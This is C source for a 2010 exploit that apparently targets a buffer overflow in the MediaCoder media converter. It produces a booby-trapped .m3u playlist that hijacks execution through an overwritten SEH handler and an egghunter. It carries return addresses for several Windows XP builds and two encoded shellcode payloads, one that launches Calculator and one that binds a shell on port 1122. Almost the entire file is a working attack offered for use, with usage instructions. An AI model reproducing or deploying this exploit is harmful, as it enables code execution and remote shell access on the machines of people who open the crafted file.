/*
 Download: http://www.mediacoderhq.com/download.htm
 Compilation: mediac.c.......Win32(cygwin,Devcpp)
 Tested on Windows xp sp3
 Date: 24.02.2010
 1.We get control of EIP by overwriting a seh handler with pop pop retn instr and pass exception.
 2.We position shellcode where is convienient(basicly anywhere in memory).
 3.We position a egghunter at the top of the stack frame and we overwrite EIP with a jmp instr to land and execute it.
 Next it will search memory for our shellcode and execute it succesfully.
 Video here: http://www.youtube.com/watch?v=S1nAWuFzyGE
 */
#include<stdio.h>
#include<getopt.h>
 
#define pausescreen() getchar()
#define FOR(i,a,b) for(i=a;i<b;++i)
#define IFeq(a,b) if(a==b)
#define IFless(a,b) if(a<b)
#define IFgreat(a,b) if(a>b)
#define IFneq(a,b) if(a!=b) 
#define IFnot(a) if(!a)
#define split(s) exit(s)
#define R return
#define nul NULL
#define VER             "0.7.3.4605"
#define POCNAME         "MediaCoder local buffer overflow exploit"
#define AUTHOR          "fl0 fl0w"
#define BUFFSIZE 0x1869F
#define NSEH_OFFSET 0x2FC
#define NOP "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"
#define size(a) strlen(a)   
#define CLEAN(a) free(a)         
        typedef char i8;
        typedef short i16;
        typedef int i32;
        typedef long i64;
        typedef const int ci32;
        enum{True=1,False=0,Error=-1};
   void print(i8*);
   void gen_random(i8*,const int);
   void exploit(i8*,i8**);
   unsigned int getFsize(FILE*,i8*);
   void printshell();
   void printret();
   void print(i8*);
   void help();
   struct {
      i8 *name;
      i32 size;
      i8 *type; 
        }shellcode[]={
        {"Calculator",343,
      "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49" 
      "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
      "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
      "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
      "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
      "\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"
      "\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"
      "\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x38"
      "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
      "\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
      "\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
      "\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44"
      "\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"
      "\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33"
      "\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x37"
      "\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"
      "\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
      "\x42\x50\x42\x50\x42\x50\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x53"
      "\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"
      "\x42\x35\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x36\x4a\x59"
      "\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"
      "\x4e\x56\x43\x46\x42\x30\x5a"},
      {"Bind port 1122",709,
      "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
      "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
      "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
      "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
      "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
      "\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
      "\x4e\x36\x46\x52\x46\x32\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x37"
      "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x48"
      "\x4f\x35\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"
      "\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
      "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
      "\x46\x4f\x4b\x33\x46\x45\x46\x32\x4a\x32\x45\x37\x45\x4e\x4b\x48"
      "\x4f\x55\x46\x32\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x44"
      "\x4b\x58\x4f\x45\x4e\x31\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
      "\x49\x38\x4e\x36\x46\x52\x4e\x41\x41\x56\x43\x4c\x41\x33\x4b\x4d"
      "\x46\x56\x4b\x38\x43\x34\x42\x53\x4b\x38\x42\x44\x4e\x30\x4b\x48"
      "\x42\x47\x4e\x51\x4d\x4a\x4b\x58\x42\x34\x4a\x30\x50\x45\x4a\x46"
      "\x50\x38\x50\x44\x50\x30\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x56"
      "\x43\x55\x48\x36\x4a\x36\x43\x33\x44\x33\x4a\x46\x47\x57\x43\x57"
      "\x44\x43\x4f\x45\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
      "\x4e\x4f\x4b\x43\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e"
      "\x48\x46\x41\x38\x4d\x4e\x4a\x50\x44\x50\x45\x35\x4c\x56\x44\x30"
      "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x55"
      "\x4f\x4f\x48\x4d\x43\x55\x43\x45\x43\x45\x43\x35\x43\x35\x43\x44"
      "\x43\x35\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x36\x4a\x36\x46\x50"
      "\x44\x36\x48\x36\x43\x35\x49\x38\x41\x4e\x45\x49\x4a\x36\x46\x4a"
      "\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
      "\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
      "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d"
      "\x4a\x36\x45\x4e\x49\x44\x48\x58\x49\x54\x47\x55\x4f\x4f\x48\x4d"
      "\x42\x55\x46\x35\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
      "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x55\x4f\x4f\x48\x4d\x45\x35"
      "\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x46\x48\x36\x4a\x46\x43\x56"
      "\x4d\x36\x49\x38\x45\x4e\x4c\x36\x42\x35\x49\x45\x49\x32\x4e\x4c"
      "\x49\x38\x47\x4e\x4c\x56\x46\x34\x49\x58\x44\x4e\x41\x43\x42\x4c"
      "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x52\x50\x4f\x44\x54\x4e\x52"
      "\x43\x39\x4d\x58\x4c\x57\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
      "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
      "\x48\x4d\x4b\x45\x47\x55\x44\x45\x41\x45\x41\x35\x41\x45\x4c\x56"
      "\x41\x50\x41\x45\x41\x55\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x36"
      "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
      "\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x58\x47\x35\x4e\x4f"
      "\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
      "\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
      "\x4f\x4f\x42\x4d\x5a" },
      {nul,0,nul}};
       struct {/*pop pop ret addr*/
       unsigned int ret;
       i8* tname; 
         }target[]={
         {0x66015926,
         "Universal(libiconv-2.dll) =>"
         },
         {0x72D115B8,
         "Windows xp sp2 en kernel32.dll =>"
         },
           {0x7C902783,
         "Windows sp3 en ntdll.dll =>"
         },
         {0x77E829EC,
         "Windows xp sp1 en =>"
         },
         {0,nul}
         };     
  i8 egghunter[]=/*IsBadReadPtr egghunter 32 bytes*/
  "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" 
  "\x66\x6C\x30\x77" //fl0w tag
  "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";  
  i8 tag[]="\x66\x6C\x30\x77"
           "\x66\x6C\x30\x77";                 
  i8 nseh[]="\xEB\x06\x90\x90"; 
  i8 buffer[BUFFSIZE];                         
  i32 c,sh;
  i8 *filen;
  i32 k;
  unsigned int retcode,eip;
  i32 main(i32 argc,i8** argv)
  {   system("cls");
      printf("[#]%s\n[#]Ver %s\n[#]Author %s\n",POCNAME,VER,AUTHOR);
      IFless(argc,2){
           help();
           print("Shellcode options:");
                printshell();
           printf("\n");    
           print("Retcode options:");    
                printret();
           split(0);}
      while((c=getopt(argc,argv,"f:s:t:v"))!=-1){
         switch(c){
                  case 'f':
                         filen=optarg;
                         break;
                  case 's':
                       sh=atoi(optarg);
                       break;
                  case 't':
                       eip=atoi(optarg);
                       break;    
                  case 'v':
                       if(strcmp(argv[5],"-t")==0)
                            k=8;
                         else
                            k=6;
                       sscanf(argv[k],"%x",&retcode);
                       break;    
                  default:
                       help();        
                   }                                 
                                 }
    exploit(filen,argv);
    print("done!"); 
    pausescreen();      
    R 0;
  }
   void exploit(i8* fname,i8** argv)
   { FILE* f=fopen(fname,"wb");
     IFnot(f){
          print("file won't write");
          split(0);   
              }
     gen_random(buffer,0x2FC);        
     memcpy(buffer+NSEH_OFFSET,nseh,4);
     if(strcmp(argv[5],"-t")==0)
     memcpy(buffer+0x300,&target[eip].ret,4);
       else
         memcpy(buffer+0x300,&retcode,4);
        
     memcpy(buffer+0x304,NOP,0x14); 
     memcpy(buffer+0x318,egghunter,size(egghunter));
     memset(buffer+0x34A,0x41,0x4D2);
     memcpy(buffer+0x81C,tag,8);
     memcpy(buffer+0x824,shellcode[sh].type,shellcode[sh].size);
     fwrite(buffer,1,0x824+shellcode[sh].size,f);
     fclose(f);
     CLEAN(buffer);
     printf("[#]File size is: %d bytes\n",getFsize(f,fname));
        }
   void print(i8* msg)
    {
       printf("[*]%s\n",msg);
    }
      void gen_random(char *s, const int  len)
    { i32 i;
      static const char alphanum[]= {
      "0123456789ABCDEFGHIJKLMNOPQRST"
      "UVWXYZabcdefghijklmnopqrstuvwxyz"};
      FOR(i,0,len)
      {
        s[i]=alphanum[rand()%(sizeof(alphanum)-1)];
      }
       s[len]=0;
      }
     unsigned int  getFsize(FILE* g,i8* gname)
    {unsigned int s;
             g=fopen(gname,"rb");
             IFeq(g,NULL)
             {
             print("File error at reading");
             exit(0);
             }          
             fseek(g,0,SEEK_END);
             s=ftell(g);
             R s;}
    void printshell()
       { 
         i32 i;
         FOR(i,0,2){
          printf("\t%d)%s %d bytes\n",i,shellcode[i].name,shellcode[i].size); }
            }  
    void printret()
    {  i32 j;
       FOR(j,0,4){
          printf("\t%d)%s 0x%x\n",j,target[j].tname,target[j].ret);       
                  }
         }        
      void help()
     {  i8 h[]="***************************************************************************\n"
                 "*syntax: [-f<file.m3u>] [-s<shellcode>]  [-t<target>] [-v<your target>]   *\n"
                 "*  -f      filename                                                       *\n"
                 "*  -s      shellcode  to run    0 or 1                                    *\n"
                 "*  -t       target                                                        *\n"
                 "*  -v      your target                                                    *\n"    
                 "*  example: mediacoder.exe -f vuln.m3u -s 0 -t 1                          *\n"
                 "*           mediacoder.exe -f vuln.m3u -s 1 -v 0xFFFFFFFF                 *\n"
                 "*                                                                         *\n"
                 "*                                                                         *\n"
                 "***************************************************************************\n";
          printf("%s",h);}  


